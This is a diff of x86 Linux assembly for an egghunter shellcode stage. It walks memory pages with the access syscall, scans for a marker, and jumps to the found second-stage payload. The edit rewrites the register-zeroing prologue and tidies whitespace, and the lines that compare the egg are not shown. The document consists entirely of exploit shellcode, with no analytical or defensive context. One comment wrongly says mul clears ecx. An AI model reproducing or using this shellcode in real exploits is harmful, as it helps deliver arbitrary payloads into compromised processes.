@@ -1,13 +1,13 @@
 global _start
 section .text
-_start:	
-    xor edx, edx
-    mov ecx, edx
-    mul edx
+_start: 
+    xor ecx, ecx            ; clear ecx 
+    mul ecx                 ; sets ecx, eax, edx to 0 
+    cld
 set_page:
-    or dx,0xfff		    ; initial page size = 4095
+    or dx,0xfff             ; initial page size = 4095
 page_size:
-    inc edx		    ; increase page size to 4096 to remove nulls
+    inc edx                 ; increase page size to 4096 to remove nulls
     lea ebx,[edx + 0x4]     ; load page into ebx
     mov al, 0x21            ; sys access
     int 0x80
@@ -19,4 +19,3 @@ page_size:
     scasd
     jnz page_size           ; if string is not found scan again
     jmp edi                 ; execute the second stage
-    
